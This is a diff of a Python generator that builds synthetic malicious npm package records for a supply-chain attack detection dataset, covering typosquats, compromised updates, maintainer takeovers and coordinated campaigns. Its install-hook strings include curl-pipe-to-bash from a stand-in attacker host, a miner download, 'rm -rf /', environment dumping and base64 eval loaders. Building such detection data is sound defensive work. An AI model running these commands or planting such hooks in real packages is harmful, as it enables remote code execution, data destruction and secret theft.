@@ -3,15 +3,15 @@ import string
 from neo4j.graph import Node
 import random
 import copy
+from datetime import datetime, timedelta, timezone
 
 def node_to_package(node: Node):
     props = {key: node[key] for key in node.keys()}
     props["element_id"] = node.element_id
     props["labels"] = list(node.labels)
 
-    json_formatted_properties = ["author","repository","dist","scripts", "_npmUser","dependencies","maintainers"]
+    json_formatted_properties = ["author", "repository", "dist", "scripts", "_npmUser", "dependencies","maintainers"]
 
-    # Convert JSON formatted strings back to json
     for property in json_formatted_properties:
         prop = props.get(property)
         if prop is not None:
@@ -23,102 +23,81 @@ def populate_database(file_path="top1000packages.txt", fn=lambda: None):
     with open(file_path, 'r') as file:
         for line in file:
             cleaned_line = line.strip()
-            print(cleaned_line)
             fn(cleaned_line)
 
+# Create a random typosquat name
 def typosquat_name(name):
-    """
-    Create a typosquat based on a benign package's name.
-    """
     if not name or len(name) < 3:
         return f"{name}-malicious"
-    
+
     technique = random.choice(['swap', 'double', 'missing', 'suffix', 'prefix'])
     name_characters = list(name)
-    
-    # Typical Typosquat techniques
+
     if technique == 'swap':
-        # Swap two adjacent characters
         i = random.randint(0, len(name_characters) - 2)
         name_characters[i], name_characters[i+1] = name_characters[i+1], name_characters[i]
     elif technique == 'double':
-        # Duplicate a character
         i = random.randint(0, len(name_characters) - 1)
         name_characters.insert(i, name_characters[i])
     elif technique == 'missing':
-        # Remove a character
         i = random.randint(0, len(name_characters) - 1)
         del name_characters[i]
     elif technique == 'suffix':
         return f"{name}-js"
     elif technique == 'prefix':
         return f"node-{name}"
-        
+
     return "".join(name_characters)
 
 def generate_malicious_package(target_benign_name, name_suffix):
-    """
-    Generates a synthetic malicious package
-    """
+    """Generates a synthetic malicious package."""
     pkg_name = typosquat_name(target_benign_name)
-    # Example malicious scripts
     script_payloads = [
         "curl -s http://evil-server.com/payload | bash",
         "wget http://attacker.cn/miner.exe",
-        "node setup_bun.js", # Recent Shai Hulud attack method
+        "node setup_bun.js",
         "eval(Buffer.from('...').toString())",
         "rm -rf /",
         "export BAD_ENV=$(printenv)"
     ]
     script_type = random.choice(["preinstall", "postinstall", "install"])
-    # For common malicious packages, look for:
-    # Low weekly download counts, low dependency counts, single maintainers, suspicious scripts, no dependencies, no descriptions, typosquat names, and early versions
     return {
         "name": pkg_name,
         "version": "0.0.1",
         "weekly_downloads": random.randint(0, 100),
         "dependency_count": random.randint(0, 1),
-        "maintainers": ["hacker_1"],
-        "scripts": {
-            script_type: random.choice(script_payloads)
-        },
+        "maintainers": [{"name": "hacker_1", "email": "h@evil.io"}],
+        "scripts": {script_type: random.choice(script_payloads)},
         "description": "",
-        "dependencies": []
+        "dependencies": [],
+        "collected_at": create_random_recent_timestamp()
     }
 
-# Create a new dataset for typosquat pkg
-def create_dataset(benign_json_data, num_malicious):
-    data = {}
-    benign_names = list(benign_json_data.keys())
-    
-    # Needs benign packages to generate typosquat names
-    if not benign_names:
-        print("No benign packages provided. Cannot generate typosquats.")
-        return {}
-        
-    for i in range(num_malicious):
-        # Pick a random benign package to target
-        target = random.choice(benign_names)
-        pkg = generate_malicious_package(target, i)
-        
-        # Ensure uniqueness in current set
-        retries = 0
-        while pkg["name"] in data and retries < 10:
-            target = random.choice(benign_names)
-            pkg = generate_malicious_package(target, i)
-            retries += 1
-            
-        data[pkg["name"]] = pkg
+# Timestamp helpers
+# Create random recent timestamp (past 180 days)
+def create_random_recent_timestamp():
+    days_ago = random.uniform(1, 180)
+    ts = datetime.now(timezone.utc) - timedelta(days=days_ago)
+    return ts.isoformat()
 
-    return data
+# Create random past datetimes (180 days)
+def create_random_recent_datetime() -> datetime:
+    days_ago = random.uniform(1, 180)
+    return datetime.now(timezone.utc) - timedelta(days=days_ago)
 
-# Create random string of characters (resembles obfuscated paylods)
+# Used to create timestamp within some n minutes around original datetime (20+- min)
+def create_random_grouped_timestamp(campaign_dt: datetime, jitter_minutes: float = 20.0):
+    offset = timedelta(minutes=random.uniform(-jitter_minutes, jitter_minutes))
+    return (campaign_dt + offset).isoformat()
+
+# Randomness helpers for obfuscation
+# Create random byte str
 def random_entropy_blob(min_len=80, max_len=200):
     n = random.randint(min_len, max_len)
     alphabet = string.ascii_letters + string.digits + "+/="
     return "".join(random.choice(alphabet) for _ in range(n))
 
-# Randomize script
+# Create random sus install script
 def subtle_script_string():
     templates = [
         "node tools/setup.js",
@@ -128,20 +107,17 @@ def subtle_script_string():
     ]
     return random.choice(templates)
 
-# Add an install script
-def add_subtle_script(pkg: dict):
+# Add subtle script hook
+def add_subtle_script(pkg):
     if "scripts" not in pkg or not isinstance(pkg["scripts"], dict):
         pkg["scripts"] = {}
-
     hook = random.choice(["preinstall", "install", "postinstall"])
-
-    # If hook exists, slightly modify it; otherwise create it
     if hook in pkg["scripts"]:
         pkg["scripts"][hook] = str(pkg["scripts"][hook]) + " && " + subtle_script_string()
     else:
         pkg["scripts"][hook] = subtle_script_string()
 
-# Update package version
+# Bump patch version
 def bump_patch_version(version: str):
     try:
         parts = version.split(".")
@@ -149,124 +125,378 @@ def bump_patch_version(version: str):
             return version
         parts[2] = str(int(parts[2]) + 1)
         return ".".join(parts)
-    except:
+    except Exception:
         return version
 
-# Create new package with small sus change that resembles an updated package
-def generate_compromised_update(benign_pkg: dict):
+# Benign scripts and descriptions to help normalize the benign datasets
+SCRIPTS = [
+    {"test": "jest --coverage", "lint": "eslint src/", "build": "tsc"},
+    {"test": "mocha test/", "build": "webpack --mode production"},
+    {"test": "tap test/*.js", "prepublishOnly": "npm run build"},
+    {"test": "jest", "prepare": "npm run build", "lint": "eslint ."},
+    {"test": "jasmine", "lint": "tslint -c tslint.json src/**/*.ts"},
+    {"test": "ava", "build": "rollup -c rollup.config.js"},
+    {"test": "node test/index.js", "preversion": "npm test"},
+    {},
+    {},
+    {},
+]
+
+DESCRIPTIONS = [
+    "Utility library for common JavaScript operations",
+    "Async flow control library for Node.js",
+    "Lightweight HTTP client with Promise support",
+    "Fast data serialization and parsing utilities",
+    "TypeScript definitions and runtime helpers",
+    "Minimal logging framework for Node applications",
+    "Schema validation and coercion library",
+    "Zero-dependency string manipulation utilities",
+    "Cross-platform file system helpers",
+    "Event emitter polyfill and extension library",
+]
+
+# Used to add realistic data to a very minimal benign package (to normalize packages)
+def enrich_benign_package(pkg):
+    pkg = copy.deepcopy(pkg)
+    name = pkg.get("name", "pkg")
+
+    if not pkg.get("scripts"):
+        pkg["scripts"] = random.choice(SCRIPTS)
+
+    if not pkg.get("description"):
+        pkg["description"] = random.choice(DESCRIPTIONS)
+
+    if not pkg.get("maintainers"):
+        handle = name.replace("-", "").replace("@", "").replace("/", "")[:12] or "maintainer"
+        pkg["maintainers"] = [{"name": handle, "email": f"{handle}@example.com"}]
+
+    if not pkg.get("repository"):
+        pkg["repository"] = {"type": "git", "url": f"git://github.com/org/{name}.git"}
+
+    if not pkg.get("dist"):
+        file_count = random.randint(5, 40)
+        pkg["dist"] = {
+            "fileCount": file_count,
+            "unpackedSize": file_count * random.randint(800, 4000),
+        }
+
+    if not pkg.get("author"):
+        pkg["author"] = {"name": "Maintainer", "email": "m@example.com"}
+
+    # Benign packages have uncorrelated, spread-out timestamps
+    if not pkg.get("collected_at"):
+        pkg["collected_at"] = create_random_recent_timestamp()
+
+    return pkg
+
+# Normalize benign dataset (NOT CURRENTLY IN USE), 
+# doing it for testing accuracy optimizations
+def enrich_benign_dataset(packages):
+    result = {}
+    for k, v in packages.items():
+        pkg = enrich_benign_package(v)
+        name = pkg.get("name") or k.split("@")[0]
+        version = pkg.get("version") or "0.0.0"
+        result[f"{name}@{version}"] = pkg
+    return result
+
+# Individual malicious generators
+# Bump version and create compromised update
+def generate_compromised_update(benign_pkg, campaign_dt = None):
     pkg = copy.deepcopy(benign_pkg)
-
-    # Bump version slightly to look like a real update
     pkg["version"] = bump_patch_version(str(pkg.get("version", "1.0.0")))
-
-    # Keep downloads realistic: compromised packages often stay popular
-    # Add small noise rather than collapsing to 0..100
     wd = float(pkg.get("weekly_downloads", 0))
     pkg["weekly_downloads"] = max(0, int(wd * random.uniform(0.9, 1.1)))
-
-    # Subtle install hook modification
     add_subtle_script(pkg)
 
     if random.random() < 0.35:
         deps = pkg.get("dependencies", [])
         if not isinstance(deps, list):
             deps = []
-        # Add a placeholder "new dep" name (synthetic) OR reuse a benign dep
         if deps:
             deps = deps + [random.choice(deps)]
         pkg["dependencies"] = deps
 
-    # Recompute dependency_count consistently
     pkg["dependency_count"] = len(pkg.get("dependencies", []))
+    pkg["collected_at"] = (create_random_grouped_timestamp(campaign_dt) if campaign_dt else create_random_recent_timestamp())
     return pkg
 
-# Create package with new maintainer
-def generate_maintainer_takeover(benign_pkg: dict):
+# New maintainer added and remove existing maintainers
+def generate_maintainer_takeover(benign_pkg, campaign_dt = None):
     pkg = copy.deepcopy(benign_pkg)
-
-    # Keep most metadata stable
     pkg["version"] = bump_patch_version(str(pkg.get("version", "1.0.0")))
 
-    # Modify maintainers slightly
     maintainers = pkg.get("maintainers", [])
     if not isinstance(maintainers, list):
         maintainers = []
-    maintainers = maintainers[:]  # copy
+    maintainers = maintainers[:]
 
-    # Add a new maintainer
+    new_m = {"name": "maintainer_new", "email": "new@unknown-domain.xyz"}
     if len(maintainers) == 0:
-        maintainers = ["maintainer_new"]
+        maintainers = [new_m]
     else:
-        maintainers.append("maintainer_new")
+        maintainers.append(new_m)
 
     pkg["maintainers"] = maintainers
-
-    # Add install script
     add_subtle_script(pkg)
-
     pkg["dependency_count"] = len(pkg.get("dependencies", []))
+    pkg["collected_at"] = (create_random_grouped_timestamp(campaign_dt) if campaign_dt else create_random_recent_timestamp())
     return pkg
 
-# Create a typosquat package with typical sus data
-def generate_realistic_typosquat(target_name: str, target_pkg: dict, benign_names: list):
+def generate_realistic_typosquat(target_name, target_pkg, benign_names):
     pkg_name = typosquat_name(target_name)
 
     base = {
         "name": pkg_name,
         "version": "1.0.0",
         "description": (target_pkg.get("description") or "Utility helpers").strip()[:80],
-        "weekly_downloads": int(max(0, random.gauss(200, 120))),  # plausible small popularity
+        "weekly_downloads": int(max(0, random.gauss(200, 120))),
         "dependencies": [],
         "scripts": {},
-        "maintainers": ["maintainer_new"],
+        "maintainers": [{"name": "maintainer_new", "email": "new@unknown-domain.xyz"}],
+        "collected_at": create_random_recent_timestamp()
     }
 
-    # Give it 1–5 dependencies sampled from the benign packages
     k = random.randint(1, 5)
     base["dependencies"] = random.sample(benign_names, k=min(k, len(benign_names)))
     base["dependency_count"] = len(base["dependencies"])
-
-    # Add subtle script (one hook)
     add_subtle_script(base)
     return base
 
-# Creates a malicious dataset where samples are modified through subtle permutations of existing benign packages.
-def create_dataset(benign_json_data, num_malicious, mix=None):
-    # Mix of packages for configuration
-    if mix is None:
-        mix = {
-            "compromised_update": 0.60,
-            "maintainer_takeover": 0.25,
-            "typosquat": 0.15,
-        }
-
-    benign_names = list(benign_json_data.keys())
+# Attack Simulations
+# Each simulation pins all affected packages to the same campaign_dt
+def simulate_coordinated_maintainer_compromise(packages, num_targets = 5, attacker_name = "attacker_account", campaign_dt = None):
+    benign_names = list(packages.keys())
     if not benign_names:
         return {}
 
-    out = {}
+    if campaign_dt is None:
+        campaign_dt = create_random_recent_datetime()
 
-    # Precompute weighted scenario list
+    targets = random.sample(benign_names, k=min(num_targets, len(benign_names)))
+
+    campaign_script = "node -e \"eval(Buffer.from('{}','base64').toString())\"".format(
+        random_entropy_blob(100, 200)
+    )
+    campaign_hook = random.choice(["preinstall", "postinstall"])
+
+    result = {}
+    for node_key in targets:
+        pkg = copy.deepcopy(packages[node_key])
+        bare_name = pkg.get("name") or node_key.split("@")[0]
+        pkg["name"] = bare_name
+        pkg["version"] = bump_patch_version(str(pkg.get("version", "1.0.0")))
+
+        maintainers = pkg.get("maintainers", [])
+        if not isinstance(maintainers, list):
+            maintainers = []
+        attacker_entry = {"name": attacker_name, "email": f"{attacker_name}@unknown-domain.xyz"}
+        pkg["maintainers"] = maintainers[:] + [attacker_entry]
+
+        if not isinstance(pkg.get("scripts"), dict):
+            pkg["scripts"] = {}
+        pkg["scripts"][campaign_hook] = campaign_script
+        pkg["dependency_count"] = len(pkg.get("dependencies", []))
+        pkg["collected_at"] = create_random_grouped_timestamp(campaign_dt, jitter_minutes=20)
+        result[f"{bare_name}@{pkg['version']}"] = pkg
+
+    return result
+
+# Simulated coordinated dependency injection
+def simulate_coordinated_dependency_injection(packages, num_targets = 5, malicious_dep_name = None, campaign_dt = None):
+    benign_names = list(packages.keys())
+    if not benign_names:
+        return {}
+
+    if malicious_dep_name is None:
+        malicious_dep_name = typosquat_name(random.choice(benign_names))
+
+    if campaign_dt is None:
+        campaign_dt = create_random_recent_datetime()
+
+    targets = random.sample(benign_names, k=min(num_targets, len(benign_names)))
+
+    result = {}
+    for node_key in targets:
+        pkg = copy.deepcopy(packages[node_key])
+        bare_name = pkg.get("name") or node_key.split("@")[0]
+        pkg["name"] = bare_name
+        pkg["version"] = bump_patch_version(str(pkg.get("version", "1.0.0")))
+        deps = pkg.get("dependencies", [])
+        if not isinstance(deps, list):
+            deps = []
+        if malicious_dep_name not in deps:
+            deps = deps + [malicious_dep_name]
+        pkg["dependencies"] = deps
+        pkg["dependency_count"] = len(deps)
+        pkg["collected_at"] = create_random_grouped_timestamp(campaign_dt, jitter_minutes=20)
+        result[f"{bare_name}@{pkg['version']}"] = pkg
+
+    # The injected dep itself. new node, campaign timestamp, suspicious features
+    result[f"{malicious_dep_name}@0.0.1"] = {
+        "name": malicious_dep_name,
+        "version": "0.0.1",
+        "weekly_downloads": random.randint(0, 50),
+        "dependency_count": 0,
+        "dependencies": [],
+        "maintainers": [{"name": "attacker_account", "email": "attacker@unknown-domain.xyz"}],
+        "scripts": {
+            "postinstall": "node -e \"eval(Buffer.from('{}','base64').toString())\"".format(
+                random_entropy_blob(100, 200)
+            )
+        },
+        "description": "",
+        "is_deprecated": False,
+        "repository": {},
+        "collected_at": create_random_grouped_timestamp(campaign_dt, jitter_minutes=5),
+    }
+
+    return result
+
+# Simulated coordinated script injection
+def simulate_coordinated_script_injection(
+    packages,
+    num_targets: int = 5,
+    campaign_dt: datetime = None,
+):
+    benign_names = list(packages.keys())
+    if not benign_names:
+        return {}
+
+    if campaign_dt is None:
+        campaign_dt = create_random_recent_datetime()
+
+    targets = random.sample(benign_names, k=min(num_targets, len(benign_names)))
+
+    shared_payload = "node -e \"eval(Buffer.from('{}','base64').toString())\"".format(
+        random_entropy_blob(120, 200)
+    )
+    campaign_hook = "postinstall"
+
+    result = {}
+    for node_key in targets:
+        pkg = copy.deepcopy(packages[node_key])
+        bare_name = pkg.get("name") or node_key.split("@")[0]
+        pkg["name"] = bare_name
+        pkg["version"] = bump_patch_version(str(pkg.get("version", "1.0.0")))
+        if not isinstance(pkg.get("scripts"), dict):
+            pkg["scripts"] = {}
+        pkg["scripts"][campaign_hook] = shared_payload
+        pkg["dependency_count"] = len(pkg.get("dependencies", []))
+        pkg["collected_at"] = create_random_grouped_timestamp(campaign_dt, jitter_minutes=20)
+        result[f"{bare_name}@{pkg['version']}"] = pkg
+    return result
+
+# Create Datasets
+def create_dataset(benign_json_data, num_malicious, mix=None):
+    # Creates a synthetic malicious dataset by applying a weighted mix of attack
+    #scenarios to the given benign packages.
+    if mix is None:
+        mix = {
+            "compromised_update":     0.15,
+            "maintainer_takeover":    0.08,
+            "typosquat":              0.07,
+            "coordinated_maintainer": 0.25,
+            "coordinated_dep_inject": 0.25,
+            "coordinated_script":     0.20,
+        }
+
+    benign_keys = list(benign_json_data.keys())
+    if not benign_keys:
+        return {}
+
+    # Bare names for use in typosquat deps and name-based operations.
+    # Works whether keys are name-only or versioned
+    bare_names = [
+        (benign_json_data[k].get("name") or k.split("@")[0])
+        for k in benign_keys
+    ]
+
     scenarios = []
     for k, w in mix.items():
         scenarios += [k] * int(w * 100)
 
-    for _ in range(num_malicious):
+    out = {}
+    added = 0
+    max_iterations = num_malicious * 6
+
+    # Randomly add different attack scenarios
+    for _ in range(max_iterations):
+        if added >= num_malicious:
+            break
+
         scenario = random.choice(scenarios)
-        target_name = random.choice(benign_names)
-        target_pkg = benign_json_data[target_name]
+        target_key = random.choice(benign_keys)
+        target_pkg = benign_json_data[target_key]
+        bare_target = target_pkg.get("name") or target_key.split("@")[0]
 
         if scenario == "compromised_update":
             m_pkg = generate_compromised_update(target_pkg)
-            m_pkg["name"] = target_name
+            m_pkg["name"] = bare_target
+            m_key = f"{m_pkg['name']}@{m_pkg['version']}"
+            if m_key not in out:
+                out[m_key] = m_pkg
+                added += 1
+
         elif scenario == "maintainer_takeover":
             m_pkg = generate_maintainer_takeover(target_pkg)
-            m_pkg["name"] = target_name
-        else:
-            # Else, typosquat
-            m_pkg = generate_realistic_typosquat(target_name, target_pkg, benign_names)
+            m_pkg["name"] = bare_target
+            m_key = f"{m_pkg['name']}@{m_pkg['version']}"
+            if m_key not in out:
+                out[m_key] = m_pkg
+                added += 1
 
-        # Ensure dict key unique (if same package name used multiple times, keep the latest)
-        out[m_pkg["name"]] = m_pkg
+        elif scenario == "typosquat":
+            m_pkg = generate_realistic_typosquat(bare_target, target_pkg, bare_names)
+            m_key = f"{m_pkg['name']}@{m_pkg['version']}"
+            if m_key not in out:
+                out[m_key] = m_pkg
+                added += 1
+
+        elif scenario == "coordinated_maintainer":
+            # Same maintainer added to multiple packages at same time
+            campaign_dt = create_random_recent_datetime()
+            batch_size = random.randint(3, 6)
+            attacker = f"attacker_{random.randint(1000, 9999)}"
+            batch = simulate_coordinated_maintainer_compromise(
+                benign_json_data,
+                num_targets=min(batch_size, len(benign_keys)),
+                attacker_name=attacker,
+                campaign_dt=campaign_dt,
+            )
+            for pkg_key, pkg in batch.items():
+                if pkg_key not in out and added < num_malicious:
+                    out[pkg_key] = pkg
+                    added += 1
+
+        # Essentially like a bunch of dependencies were added to multiple different packages at around the same time
+        elif scenario == "coordinated_dep_inject":
+            campaign_dt = create_random_recent_datetime()
+            batch_size = random.randint(3, 6)
+            dep_name = typosquat_name(random.choice(bare_names))
+            batch = simulate_coordinated_dependency_injection(
+                benign_json_data,
+                num_targets=min(batch_size, len(benign_keys)),
+                malicious_dep_name=dep_name,
+                campaign_dt=campaign_dt,
+            )
+            for pkg_key, pkg in batch.items():
+                if pkg_key not in out and added < num_malicious:
+                    out[pkg_key] = pkg
+                    added += 1
+
+        # Bunch of scripts (that are the same) added to multiple different packages at same time
+        elif scenario == "coordinated_script":
+            campaign_dt = create_random_recent_datetime()
+            batch_size = random.randint(3, 6)
+            batch = simulate_coordinated_script_injection(
+                benign_json_data,
+                num_targets=min(batch_size, len(benign_keys)),
+                campaign_dt=campaign_dt,
+            )
+            for pkg_key, pkg in batch.items():
+                if pkg_key not in out and added < num_malicious:
+                    out[pkg_key] = pkg
+                    added += 1
 
     return out
